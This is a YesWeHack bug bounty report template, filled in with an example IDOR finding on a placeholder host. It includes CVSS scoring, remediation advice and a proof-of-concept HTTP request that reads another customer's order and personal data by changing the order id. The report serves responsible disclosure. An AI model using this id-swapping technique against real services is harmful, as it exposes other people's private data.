# YesWeHack report template

YesWeHack fields: Title, Scope asset, Severity, CVSS, Description, Proof of
Concept, Impact, Remediation.

---

**Title**

```
Any customer can read any other customer's order history and PII via order id
```

---

**Scope**

```
app.example.com
```

---

**Severity**

```
High
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5)
```

---

**Description**

`GET /api/orders/{id}` returns an order by id without checking ownership. Any
authenticated user can read any order.

---

**Proof of Concept**

1. Account A: `POST /api/orders` → id `1042`.
2. Account B: `POST /api/orders` → id `1043`.
3. Account A: `GET /api/orders/1043` → 200 with B's data.

```http
GET /api/orders/1043 HTTP/1.1
Host: app.example.com
Cookie: session=<A_REDACTED>
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":1043,"user":"b@example.com","phone":"REDACTED","address":"REDACTED"}
```

---

**Impact**

Any customer reads any other customer's PII and order history. No rate limit.
GDPR-relevant.

---

**Remediation**

Filter by `user_id`; return 404 for non-owners; apply to child endpoint and
export.

---

**Attachments**

request/response pairs, screenshot.
